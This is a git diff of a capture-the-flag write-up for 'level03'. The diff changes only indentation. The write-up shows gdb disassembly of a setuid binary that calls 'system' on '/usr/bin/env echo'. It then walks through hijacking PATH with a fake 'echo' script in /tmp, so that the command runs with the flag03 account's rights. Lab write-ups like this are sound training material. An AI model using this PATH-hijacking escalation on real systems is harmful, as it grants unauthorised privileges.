@@ -5,7 +5,7 @@
 - A `level03` file is located inside the home directory of level03
 
 - This is an executable file with special rights:
-	>`-rwsr-sr-x 1 flag03  level03 8627 Mar  5  2016 level03`
+>`-rwsr-sr-x 1 flag03  level03 8627 Mar  5  2016 level03`
 
 - Trying to execute it being logged as `level03` will execute it as `flag03`
 
@@ -42,21 +42,21 @@
 ```
 
 - We can see multiple function calls but the interesting one is `system` :
-	>`0x080484fe <+90>:    call   0x80483b0 <system@plt>`
+>`0x080484fe <+90>:    call   0x80483b0 <system@plt>`
 
 - The line above moves the argument of `system` on top of the stack:
-	>`0x080484f7 <+83>:    movl   $0x80485e0,(%esp)`
+>`0x080484f7 <+83>:    movl   $0x80485e0,(%esp)`
 
 - Let's display the content of `0x80485e0` with `(gdb) x/s 0x80485e0` :
-	>`0x80485e0:       "/usr/bin/env echo Exploit me"`
+>`0x80485e0:       "/usr/bin/env echo Exploit me"`
 
 - We can see that the `echo` command is vulnerable to `PATH` environment variable manipulation because it is called using `/usr/bin/env` which forces the binary to be found inside `PATH` variable
 
 - We create a shell script named `echo` inside `/tmp` which contains:
-	>`getflag`
+>`getflag`
 
 - We add `/tmp` at the front of `PATH` with:
-	>`export PATH=/tmp:$PATH`
+>`export PATH=/tmp:$PATH`
 
 - We run `./level03` inside the home directory of `level03`
 
